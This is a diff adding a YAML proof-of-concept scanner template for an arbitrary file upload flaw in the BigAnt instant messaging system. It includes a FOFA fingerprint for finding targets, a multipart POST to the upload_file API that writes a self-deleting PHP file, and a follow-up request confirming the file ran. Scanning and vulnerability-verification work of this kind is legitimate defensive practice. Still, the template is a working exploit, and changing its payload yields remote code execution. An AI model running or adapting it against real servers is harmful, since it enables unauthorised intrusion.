@@ -1,0 +1,36 @@
+id: poc-yaml-jiuqitech-bigant-ims-upload-file-anyfile-upload
+info:
+  name: 九麒科技 BigAnt 即时通讯系统 upload_file 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 任意上传
+  finger: 即时通讯系统
+  fofa: body="/Public/static/admin/admin_common.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /?m=Api&c=DispersedAddin&a=upload_file
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+  data: '------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="file_info"
+
+
+    [{"file_path":"{{.t1}}.php"}]
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="file"; filename="1.txt"
+
+
+    <?php echo md5({{.t1}});unlink(__FILE__);?>
+
+    ------WebKitFormBoundary--'
+  expression: status_code == 200 && contains(body,"添加成功")
+- path: /{{.t1}}.php
+  expression: status_code == 200 && body == t2
+  method: GET
+transport: http
